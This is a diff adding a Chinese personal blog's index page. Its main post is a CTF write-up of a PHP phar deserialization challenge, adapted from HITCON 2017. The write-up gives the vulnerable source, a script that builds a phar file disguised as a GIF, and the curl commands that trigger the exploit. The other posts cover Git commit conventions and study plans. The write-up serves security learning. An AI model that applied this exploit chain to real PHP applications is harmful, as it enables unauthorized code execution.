@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+    
+    <title>爱的伊苏&#39;s blog</title>
+    <meta charset="utf-8">
+    
+    <meta name="title" content="爱的伊苏&#39;s blog">
+    <meta name="description" content="代码使我快乐">
+    <meta property="og:image" content="/favicon.png">
+    <meta property="og:image:width" content="200" />
+    <meta property="og:image:height" content="200" />
+    <link rel="shortcut icon" href="/favicon.png">
+    
+    <link rel="stylesheet"
+        href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.17.1/build/styles/arduino-light.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.17.1/build/highlight.min.js"></script>
+    <script>hljs.initHighlightingOnLoad();</script>
+    
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<script src="/js/jquery.min.js"></script>
+
+    
+<script src="/js/saki.js"></script>
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+  <header class="header">
+  <div class="blog-title">
+    <a href="/" class="logo">爱的伊苏&#39;s blog</a>
+  </div>
+  <nav class="navbar">
+    <ul class="menu">
+      
+      
+      
+      <li class="menu-item">
+        
+        <a href="/" class="menu-item-link">Home</a>
+        
+      </li>
+      
+      
+      
+      <li class="menu-item">
+        
+        <a href="/archives" class="menu-item-link">Archives</a>
+        
+      </li>
+      
+      
+      
+      <li class="menu-item">
+        
+        <a href="/about" class="menu-item-link">About</a>
+        
+      </li>
+      
+      
+      
+      <li class="menu-item">
+        
+        <a href="/rss" class="menu-item-link">RSS</a>
+        
+      </li>
+      
+    </ul>
+  </nav>
+</header>
+  <main class="main">
+    <section class="posts">
+  
+  <article class="post">
+    <div class="post-title">
+      <a class="post-title-link" href="/2020/06/07/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%97%AE%E9%A2%98/">网络安全:反序列化问题</a>
+    </div>
+    <div class="post-content">
+      
+      <p>( ｡ớ ₃ờ)ھ经典反序列化问题,今天遇到了一个反序列化问题，最后一步连续踩坑…着实很难受(自己太菜了)！<br>话不多说我们先来看一看题目：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!file_exists(<span class="string">"/var/www/data/secret"</span>)) &#123;</span><br><span class="line">   $SECRET = randomkeys(<span class="number">16</span>);</span><br><span class="line">   file_put_contents(<span class="string">"/var/www/data/secret"</span>, $SECRET);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   $SECRET = file_get_contents(<span class="string">"/var/www/data/secret"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">"HTTP_X_REAL_IP"</span>])) $SERVER_IP = $_SERVER[<span class="string">"HTTP_X_REAL_IP"</span>];</span><br><span class="line"><span class="keyword">else</span> $SERVER_IP = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span><br><span class="line">$SANDBOX = <span class="string">"/var/www/data/"</span> . base64_encode(<span class="string">"ctf"</span> . $SERVER_IP);    <span class="comment">// 根据 remote_addr 给每个人创建一个沙盒</span></span><br><span class="line">@mkdir($SANDBOX);</span><br><span class="line">@chdir($SANDBOX);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">"session-data"</span>])) &#123;</span><br><span class="line">   $data = serialize(<span class="keyword">new</span> User($SANDBOX));</span><br><span class="line">   $hmac = hash_hmac(<span class="string">"sha1"</span>, $data, $SECRET);    <span class="comment">//将每个人唯一的沙盒对象加上签名后作为 session-data</span></span><br><span class="line">   setcookie(<span class="string">"session-data"</span>, sprintf(<span class="string">"%s-----%s"</span>, $data, $hmac));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">   <span class="keyword">public</span> $avatar;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;avatar = $path;    <span class="comment">//设置了头像的路径为沙盒路径</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span> <span class="keyword">extends</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       $_GET[<span class="string">"lucky"</span>]();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">randomkeys</span><span class="params">($length)</span></span>&#123;   </span><br><span class="line">   $output=<span class="string">''</span>;   </span><br><span class="line">   <span class="keyword">for</span> ($a = <span class="number">0</span>; $a&lt;$length; $a++) &#123;   </span><br><span class="line">       $output .= chr(mt_rand(<span class="number">0</span>, <span class="number">0xFF</span>));    <span class="comment">//生成php随机数   </span></span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">return</span> $output;   </span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   $flag = file_get_contents(<span class="string">"/flag"</span>);</span><br><span class="line">   <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_session</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">global</span> $SECRET;</span><br><span class="line">   $data = $_COOKIE[<span class="string">"session-data"</span>];</span><br><span class="line">   <span class="keyword">list</span>($data, $hmac) = explode(<span class="string">"-----"</span>, $data, <span class="number">2</span>);</span><br><span class="line">   <span class="keyword">if</span> (!<span class="keyword">isset</span>($data, $hmac) || !is_string($data) || !is_string($hmac)) &#123;</span><br><span class="line">       <span class="keyword">die</span>(<span class="string">"Bye"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="keyword">if</span> (!hash_equals(hash_hmac(<span class="string">"sha1"</span>, $data, $SECRET), $hmac)) &#123;</span><br><span class="line">       <span class="keyword">die</span>(<span class="string">"Bye Bye"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">   $data = unserialize($data);    <span class="comment">//判断身份，如果身份正确返回头像路径(沙盒路径)</span></span><br><span class="line">   <span class="keyword">if</span> (!<span class="keyword">isset</span>($data-&gt;avatar)) &#123;    <span class="comment">//该函数不可绕过</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">"Bye Bye Bye"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="keyword">return</span> $data-&gt;avatar;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($path)</span> </span>&#123;    <span class="comment">//获取头像，检查头是否为GIF89a ，正确后存入沙盒</span></span><br><span class="line">   $data = file_get_contents($_GET[<span class="string">"url"</span>] . <span class="string">"/avatar.gif"</span>);</span><br><span class="line">   <span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">6</span>) !== <span class="string">"GIF89a"</span>) &#123;    <span class="comment">//这个就是利用 phar:// 进行反序列化的点</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">"Fuck off"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">   file_put_contents($path . <span class="string">"/avatar.gif"</span>, $data);</span><br><span class="line">   <span class="keyword">die</span>(<span class="string">"Upload OK"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">($path)</span> </span>&#123;    <span class="comment">//获取这个沙盒中的头像</span></span><br><span class="line">   <span class="keyword">if</span> (!file_exists($path . <span class="string">"/avatar.gif"</span>)) &#123;</span><br><span class="line">       $path = <span class="string">"/var/www/html"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">   header(<span class="string">"Content-Type: image/gif"</span>);</span><br><span class="line">   <span class="keyword">die</span>(file_get_contents($path . <span class="string">"/avatar.gif"</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$mode = $_GET[<span class="string">"m"</span>];</span><br><span class="line"><span class="keyword">if</span> ($mode == <span class="string">"upload"</span>) &#123;</span><br><span class="line">   upload(check_session());</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ($mode == <span class="string">"show"</span>) &#123;</span><br><span class="line">   show(check_session());</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>这道题是根据经典题目进行的改编，进行了简化，关键位置已经加上了注释。原题目为Orange 在 2017 年 hitcon 上面出的利用 Phar 进行反序列化。<br>题目很简短，接下来就让我们一起分析一下这道题。<br>题目简析</p>
+<p>这是一个反序列化的题目。但是当年这道题全球0解，原因是用户认证部分不可以绕过，如果我们想要利用unserailize()，通过控制参数去实现反序列化，必须先绕过cookie检验。<br>但是cookie是通过remote_addr配合sha1进行hmac签名生成的，几乎不可能绕过，当时做题的人统统沉迷于此，才最终全球0解。<br>另辟蹊径</p>
+<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>我们使用 Phar 反序列化的条件有三点<br>(1)文件上传点<br>(2)系统文件函数<br>(3) phar:// 伪协议</p>
+<p>可以看到 upload 函数，完美契合我们的要求，我们此时只要精心构造一个包含Admin对象和avatar.gif文件，并且起始为 GIF89a 的phar文件传上去，下一次通过Phar://协议让file_get_contents 请求这个文件就可以实现我们对 Admin 对象的反序列化了！</p>
+<p>程序示例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span> </span>&#123;</span><br><span class="line">   <span class="keyword">public</span> $avatar = <span class="string">'orz'</span>;  </span><br><span class="line">&#125; </span><br><span class="line">$p = <span class="keyword">new</span> Phar(<span class="keyword">__DIR__</span> . <span class="string">'/avatar.phar'</span>, <span class="number">0</span>);</span><br><span class="line">$p[<span class="string">'file.php'</span>] = <span class="string">'&lt;?php ?&gt;'</span>;</span><br><span class="line">$p-&gt;setMetadata(<span class="keyword">new</span> Admin());</span><br><span class="line">$p-&gt;setStub(<span class="string">'GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">rename(<span class="keyword">__DIR__</span> . <span class="string">'/avatar.phar'</span>, <span class="keyword">__DIR__</span> . <span class="string">'/avatar.gif'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>解题过程</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl http://hostname --cookie-jar cookie</span><br><span class="line">返回 ： ... 无关紧要</span><br><span class="line">curl -b cookie 'http://hostname?m=upload&amp;url=http://你的服务器host'</span><br><span class="line">返回：Upload OK%</span><br><span class="line">curl -b cookie 'http://hostname?m=upload&amp;url=phar:///var/www/data/（ctf + 本地IP）base64编码&amp;lucky=getFlag</span><br></pre></td></tr></table></figure>
+
+<p>返回：flag<br>即可解出～！！(*･ω･)</p>
+<h2 id="题目回顾"><a href="#题目回顾" class="headerlink" title="题目回顾"></a>题目回顾</h2><p>在2020年做这种题目网上题解一艘一堆，直接初步定位题目类型简简单单，但是具体一些细节也会让你很难直接做对<br>首先这道题是base64不是md5，有的人看完原题直接就用md5，老老实实看题还是有必要的<br>此外这道题没有用到匿名函数，省去了写脚本的步骤，降低了难度<br>太久没看php最近都在看Go，看见’ctf’ . ‘ip’ 以为是一个类或者结构体的属性….(是拼接啊喂！基础啊老哥！！！)<br>最后（ctf + 本地IP）base64 直接在浏览器，Brupsuite，POSTMAN都可以很明确的获取到，这里也是本人实力眼瞎没有看到…其实！！！题目里明明写了是ctf和IP拼接！！！啊啊啊！！这个错误耗时3小时，最后还是交流了一下才发现没加….一个刻骨铭心的错误Otz<br>这道题每个用户可以彼此空间隔离，不会出现一个上传，全体白嫖的现象，妙啊</p>
+<h2 id="尾言"><a href="#尾言" class="headerlink" title="尾言"></a>尾言</h2><p>遇到自己一小时解决不了的问题还是交流一下比较好，没有交流很容易自闭hhh<br>最后BiliBili贴代码怎么自动高光，需要后续研究一下=。=手动变色太麻烦了<br>有哪里想交流随时留言！！感觉安全方面学习交流还是比没有代码那么方便，欢迎交流啊～</p>
+<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>如果想要深入学习反序列化，为各位推荐一个大大大佬的博文<br><a href="https://www.k0rz3n.com/2018/11/19/一篇文章带你深入理解PHP反序列化漏洞/#0X05-利用-phar-拓展-PHP-反序列化的攻击面" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/11/19/一篇文章带你深入理解PHP反序列化漏洞/#0X05-利用-phar-拓展-PHP-反序列化的攻击面</a></p>
+
+      
+    </div>
+    <div class="post-meta">
+      <span class="post-time">2020/06/07</span>
+    </div>
+  </article>
+  
+  <article class="post">
+    <div class="post-title">
+      <a class="post-title-link" href="/2020/05/16/Git-commit-%E8%A7%84%E8%8C%83/">Git commit 规范</a>
+    </div>
+    <div class="post-content">
+      
+      <h2 id="背景"><a href="#背景" class="headerlink" title="背景:"></a>背景:</h2><pre><code>Git毫无疑问是现在最流行的版本控制工具。在回顾项目，定位问题的过程中，书写良好的commit message可以提高效率~♪（＾∀＾●）ﾉｼ写这个也是自己的备忘录～</code></pre><h2 id="规范-直接上手！"><a href="#规范-直接上手！" class="headerlink" title="规范?直接上手！"></a>规范?直接上手！</h2><h4 id="type"><a href="#type" class="headerlink" title="type"></a>type</h4><p>type为必填项，用于指定commit的类型，约定了feat、fix两个主要type，以及docs、style、build、refactor、revert五个特殊type，其余type暂不使用。</p>
+<h6 id="主要type"><a href="#主要type" class="headerlink" title="主要type"></a>主要type</h6><table>
+<thead>
+<tr>
+<th>名称</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>feat</td>
+<td>增加新功能</td>
+</tr>
+<tr>
+<td>fix</td>
+<td>修复bug</td>
+</tr>
+</tbody></table>
+<h6 id="特殊type"><a href="#特殊type" class="headerlink" title="特殊type"></a>特殊type</h6><table>
+<thead>
+<tr>
+<th>名称</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>docs</td>
+<td>只改动了文档相关的内容</td>
+</tr>
+<tr>
+<td>style</td>
+<td>不影响代码含义的改动，例如去掉空格、改变缩进、增删分号</td>
+</tr>
+<tr>
+<td>build</td>
+<td>构造工具的或者外部依赖的改动，例如webpack，npm</td>
+</tr>
+<tr>
+<td>refactor</td>
+<td>代码重构时使用</td>
+</tr>
+<tr>
+<td>revert</td>
+<td>执行git revert打印的message</td>
+</tr>
+</tbody></table>
+<h6 id="暂不使用type"><a href="#暂不使用type" class="headerlink" title="暂不使用type"></a>暂不使用type</h6><table>
+<thead>
+<tr>
+<th>名称</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>test</td>
+<td>添加测试或者修改现有测试</td>
+</tr>
+<tr>
+<td>perf</td>
+<td>提高性能的改动</td>
+</tr>
+<tr>
+<td>ci</td>
+<td>与CI（持续集成服务）有关的改动</td>
+</tr>
+<tr>
+<td>chore</td>
+<td>不修改src或者test的其余修改，例如构建过程或辅助工具的变动</td>
+</tr>
+</tbody></table>
+<h6 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h6><p>当一次改动包括主要type与特殊type时，统一采用主要type</p>
+<h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><p>我现在更喜欢commit干练即可<br>等到提合并请求时再详细写明原因</p>
+
+      
+    </div>
+    <div class="post-meta">
+      <span class="post-time">2020/05/16</span>
+    </div>
+  </article>
+  
+  <article class="post">
+    <div class="post-title">
+      <a class="post-title-link" href="/2020/04/05/%E6%B8%85%E6%98%8E%E6%97%A5%E5%B8%B8/">清明日常</a>
+    </div>
+    <div class="post-content">
+      
+      <p>最近最大的收获是发现了极客时间这个宝藏平台，里面教程的内容普遍比较高。刚刚看完《Go语言从入门到实战》比B站的那些培训班资源讲的还是要深刻不少，我很喜欢。今天看了几节Linux实战，和Git三剑客。都不错，但是在后续日常他们优先度将不会太高。</p>
+<p>后续优先学习数据结构和算法之美，然后是MySQL实战。</p>
+<p>关于Caffe中s2vt的使用，现使用docker+cpu模式进行s2vt的训练，目前断断续续已经运行一天还没出结果…</p>
+<p>如果明天还没有出结果，将使用GPU模式进行模型训练，要是出结果了就写一篇博客记录一下</p>
+
+      
+    </div>
+    <div class="post-meta">
+      <span class="post-time">2020/04/05</span>
+    </div>
+  </article>
+  
+  <article class="post">
+    <div class="post-title">
+      <a class="post-title-link" href="/2020/03/25/%E4%BC%8D%E4%BD%B0%E8%AE%A1%E5%88%92/">伍佰计划</a>
+    </div>
+    <div class="post-content">
+      
+      <p>引经据典，轮子哥说过，代码并不是一件困难的事情，一百万行代码足以。</p>
+<p>上周亲自尝试了这个方法，发现自己每天也就只能写200行代码。</p>
+<p>所以在能力没有达到时，果断降低自己心理期望不失为一种策略，计划每天早起1个leetcode</p>
+<p>今天12:30上床睡觉，明天5:50起床干活</p>
+<p>从每天开始，早起锻炼10min，跑步20min。然后开始刷算法！</p>
+<p>每天缺乏引导！从今天的博客开始</p>
+
+      
+    </div>
+    <div class="post-meta">
+      <span class="post-time">2020/03/25</span>
+    </div>
+  </article>
+  
+</section>
+
+<nav class="page-nav">
+  <a href="/" class="more">较旧的文章</a>
+</nav>
+
+<p class="license">本站文章使用 CC BY-NC-SA 4.0 许可证</p>
+  </main>
+</body>
+
+</html>
